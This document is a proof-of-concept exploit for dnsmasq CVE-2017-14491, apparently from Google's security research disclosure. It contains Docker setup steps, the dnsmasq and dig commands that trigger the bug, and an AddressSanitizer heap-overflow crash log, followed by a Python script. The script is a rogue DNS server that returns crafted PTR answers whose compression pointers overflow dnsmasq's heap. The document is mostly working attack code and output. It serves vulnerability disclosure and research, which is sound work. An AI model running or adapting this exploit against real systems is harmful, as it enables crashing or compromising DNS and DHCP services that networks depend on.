'''
Sources:
https://raw.githubusercontent.com/google/security-research-pocs/master/vulnerabilities/dnsmasq/CVE-2017-14491.py
https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html

1) Build the docker and open three terminals

docker build -t dnsmasq .
docker run --rm -t -i --name dnsmasq_test dnsmasq bash
docker cp poc.py dnsmasq_test:/poc.py
docker exec -it <container_id> bash
docker exec -it <container_id> bash

2) On one terminal let’s launch attacker controlled DNS server:

# python poc.py  127.0.0.2 53
Listening at 127.0.0.2:53

3) On another terminal let’s launch dnsmasq forwarding queries to attacker controlled DNS:

# /testing/dnsmasq/src/dnsmasq -p 53535 --no-daemon --log-queries -S 127.0.0.2 --no-hosts --no-resolv
dnsmasq: started, version 2.78test2-8-ga3303e1 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt no-DBus no-i18n no-IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth no-DNSSEC loop-detect inotify
dnsmasq: using nameserver 127.0.0.2#53
dnsmasq: cleared cache

4) Let’s fake a client making a request twice (or more) so we hit the dnsmasq cache:

# dig @localhost -p 53535 -x 8.8.8.125 > /dev/null
# dig @localhost -p 53535 -x 8.8.8.125 > /dev/null

5)  The crash might not be triggered on the first try due to the non-deterministic order of the dnsmasq cache. Restarting dnsmasq and retrying should be sufficient to trigger a crash.

==1159==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62200001dd0b at pc 0x0000005105e7 bp 0x7fff6165b9b0 sp 0x7fff6165b9a8
WRITE of size 1 at 0x62200001dd0b thread T0
    #0 0x5105e6 in add_resource_record /test/dnsmasq/src/rfc1035.c:1141:7
    #1 0x5127c8 in answer_request /test/dnsmasq/src/rfc1035.c:1428:11
    #2 0x534578 in receive_query /test/dnsmasq/src/forward.c:1439:11
    #3 0x548486 in check_dns_listeners /test/dnsmasq/src/dnsmasq.c:1565:2
    #4 0x5448b6 in main /test/dnsmasq/src/dnsmasq.c:1044:7
    #5 0x7fdf4b3972b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
    #6 0x41cbe9 in _start (/test/dnsmasq/src/dnsmasq+0x41cbe9)

0x62200001dd0b is located 0 bytes to the right of 5131-byte region [0x62200001c900,0x62200001dd0b)
allocated by thread T0 here:
    #0 0x4cc700 in calloc (/test/dnsmasq/src/dnsmasq+0x4cc700)
    #1 0x5181b5 in safe_malloc /test/dnsmasq/src/util.c:267:15
    #2 0x54186c in main /test/dnsmasq/src/dnsmasq.c:99:20
    #3 0x7fdf4b3972b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)

SUMMARY: AddressSanitizer: heap-buffer-overflow /test/dnsmasq/src/rfc1035.c:1141:7 in add_resource_record
Shadow bytes around the buggy address:
  0x0c447fffbb50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c447fffbb60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c447fffbb70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c447fffbb80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c447fffbb90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c447fffbba0: 00[03]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c447fffbbb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c447fffbbc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c447fffbbd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c447fffbbe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c447fffbbf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1159==ABORTING
'''

#!/usr/bin/python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwind <gynvael@google.com>
#  Ron Bowes - Xoogler :/

import socket
import struct
import sys

def dw(x):
  return struct.pack('>H', x)

def udp_handler(sock_udp):

  data, addr = sock_udp.recvfrom(1024)
  print '[UDP] Total Data len recv ' + str(len(data))
  id = struct.unpack('>H', data[0:2])[0]
  query = data[12:]

  data = dw(id)                        # id
  data += dw(0x85a0)                   # flags
  data += dw(1)                        # questions
  data += dw(0x52)                     # answers
  data += dw(0)                        # authoritative
  data += dw(0)                        # additional

  # Add the question back - we're just hardcoding it
  data += ('\x03125\x018\x018\x018\x07in-addr\x04arpa\x00' +
           '\x00\x0c' + # type = 'PTR'
           '\x00\x01')   # cls = 'IN'

  # Add the first answer
  data += ('\xc0\x0c' + # ptr to the name
           '\x00\x0c' + # type = 'PTR'
           '\x00\x01' + # cls = 'IN'
           '\x00\x00\x00\x3d' + # ttl
           '\x04\x00' + # size of this resource record
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x3e' + 'Z'*62 +
           '\x0e' + 'Z'*14 +
           '\x00')

  # Add the next answer, which is written out in full
  data += ('\xc0\x0c' + # ptr to the name
           '\x00\x0c' + # type = 'PTR'
           '\x00\x01' + # cls = 'IN'
           '\x00\x00\x00\x3d' + # ttl
           '\x00\x26' + # size of this resource record
           '\x08DCBBEEEE\x04DDDD\x08CCCCCCCC\x04AAAA\x04BBBB\x03com\x00')

  for _ in range(79):
    data += ('\xc0\x0c' + # ptr to the name
             '\x00\x0c' + # type = 'PTR'
             '\x00\x01' + # cls = 'IN'
             '\x00\x00\x00\x3d' + # ttl
             '\x00\x02' + # size of the compressed resource record
             '\xc4\x40')   # pointer to the second record's name

  data += ('\xc0\x0c' + # ptr to the name
           '\x00\x0c' + # type = 'PTR'
           '\x00\x01' + # cls = 'IN'
           '\x00\x00\x00\x3d' + # ttl
           '\x00\x11' + # size of this resource record
           '\x04EEEE\x09DAABBEEEE\xc4\x49')

  sock_udp.sendto(data, addr)

if __name__ == '__main__':

  if len(sys.argv) != 3:
    print 'Usage: %s <ip> <port>\n' % sys.argv[0]
    sys.exit(0)

  ip = sys.argv[1]
  port = int(sys.argv[2])

  sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_udp.bind((ip, port))
  print 'Listening at %s:%d\n' % (ip, port)

  while True:
    udp_handler(sock_udp)

  sock_udp.close()